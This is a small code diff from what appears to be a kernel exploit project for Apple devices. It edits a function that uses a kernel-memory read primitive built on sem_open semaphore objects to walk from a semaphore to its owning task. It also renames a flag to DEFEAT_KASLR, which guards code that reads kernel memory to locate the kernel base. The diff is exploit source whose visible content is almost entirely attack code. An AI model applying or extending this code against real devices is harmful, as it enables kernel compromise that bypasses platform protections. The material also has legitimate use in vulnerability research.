@@ -94,15 +94,13 @@ void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
-    //XXXXXXXXX CONSTRUCTION
     volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
     u64 pseminfo_kaddr = pnode->pinfo;
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
 
-    bool ENABLE_EXPERIMENTAL_PATCHFINDER = false;
-    if(ENABLE_EXPERIMENTAL_PATCHFINDER) {
-        //TODO: break kaslr
+    bool DEFEAT_KASLR = false;
+    if(DEFEAT_KASLR) {
         printf("task_kaddr: 0x%llx\n", task_kaddr);
         uint64_t something = 0;
         kread((u64)kfd, task_kaddr + 0x38, &something, sizeof(something));
@@ -110,9 +108,6 @@ void kread_sem_open_find_proc(struct kfd* kfd)
         uint64_t something_page = something & ~(0xffff);
         something_page -= 0x1000000;
         printf("something_page: 0x%llx\n", something_page);
-        
-        //    printf("kread_sem_open_find_proc CCC\n");
-        //    sleep(1);
         
         uint64_t kbase = 0;
         while (true) {
